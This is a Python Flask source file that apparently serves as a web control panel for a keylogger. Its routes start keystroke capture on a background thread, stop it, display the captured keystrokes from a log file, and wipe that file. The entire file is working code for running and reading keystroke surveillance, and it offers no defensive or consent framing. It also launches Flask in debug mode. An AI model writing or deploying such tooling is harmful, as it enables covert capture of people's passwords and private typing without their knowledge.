from flask import Flask, render_template, request, redirect, url_for
from threading import Thread
from keylogger import Keylogger

app = Flask(__name__)
keylogger_active = False
keylogger = Keylogger()
listener_thread = None

@app.route('/')
def index():
    return render_template('index.html', active=keylogger_active)

@app.route('/start', methods=['POST'])
def start():
    global keylogger_active, listener_thread
    if not keylogger_active:
        keylogger_active = True
        listener_thread = Thread(target=keylogger.start)
        listener_thread.start()
    return redirect(url_for('index'))

@app.route('/stop', methods=['POST'])
def stop():
    global keylogger_active
    if keylogger_active:
        keylogger_active = False
        keylogger.stop()
    return redirect(url_for('index'))

@app.route('/logs')
def logs():
    try:
        with open("log.txt", "r") as f:
            log_contents = f.read()
    except FileNotFoundError:
        log_contents = "No logs found."

    return render_template('logs.html', logs=log_contents)

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    open("log.txt", "w").close()  # This clears the log file by opening it in write mode
    return redirect(url_for('logs'))

if __name__ == "__main__":
    app.run(debug=True)
